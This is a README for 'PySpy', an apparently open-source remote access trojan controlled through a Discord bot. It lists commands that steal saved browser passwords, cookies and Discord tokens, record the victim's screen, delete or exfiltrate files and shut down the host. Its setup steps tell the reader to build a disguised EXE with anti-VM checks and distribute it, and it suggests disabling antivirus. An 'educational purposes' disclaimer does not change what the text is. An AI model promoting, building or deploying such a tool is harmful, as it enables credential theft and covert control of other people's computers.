# PySpy
PySpy is an open-source Discord RAT (Remote Access Tool) that can be controlled via your Discord server. This tool is for educational purposes and personal experimentation only.
## Disclaimer
This project is intended for educational purposes only. The author is not responsible for any misuse of this software.
## Commands
- !help - Sends the help embed
- !screenshot - Takes a screenshot
- !type \<phrase\> - Types the selected phrase
- !screenrecord \<length\> - Records victums screen for selected time
- !passwords - Returns saved browser passwords
- !exit - Closes the current session and exits the exe
- !message \<title\> \<message\> - Shows a message box with the selected arguments
- !discord - Sends Discord account info and token
- !cookies - Sends browser cookies
- !cd \<dir/defined\> - Sets the current working directory
- !listdir - Lists the contents of the current working directory
- !delete \<path\> - Deletes the selected file
- !upload \<attachment\> - Uploads a file to the current directory
- !download \<path\> - Downloads a file from the selected path \(50 MB Limit\)
- !wallpaper \<attachment\> - Sets the wallpaper to a provided photo
- !tts \<message\> - Speaks the provided message aloud
- !run \<path\> - Runs a file provided in the path \(WIP\)
- !shutdown - Shuts down the host computer
- !restart - Restarts the host computer
- !press \<keys\> - Presses any amount of keys all at once
- !website \<url\> - Opens the url in the default browser
## Setup
1. Clone the repository
   ```
   git clone https://github.com/LunarrBlue/PySpy.git
   cd PySpy
2. Configure `config.json`
   - "token" -> Your Discord bots token
   - "app_name" -> Name of the EXE
   - "app_logo" -> Path to EXE logo
   - "members" -> Mimimum members in a Discord server to be shown by `!discord`
   - "anti-vm" -> Defines if anti-vm should be enabled
3. Run `build.bat` and wait
4. Distribute the EXE located in `dist`
---
If you would like to rebuild the EXE for any reason, run `rebuild.bat` then follow the steps above.
## Ideas
- File encryption & decryption
- Work on !run
- Fix 50 MB download limit
- Fix when a directory has too many files to send
## Help
- Bot opens empty sessions
   - Ran by a VM or AV caught it, try turning off real-time protection.
- You must have Python 3.12.4
- Minimum of Windows 7
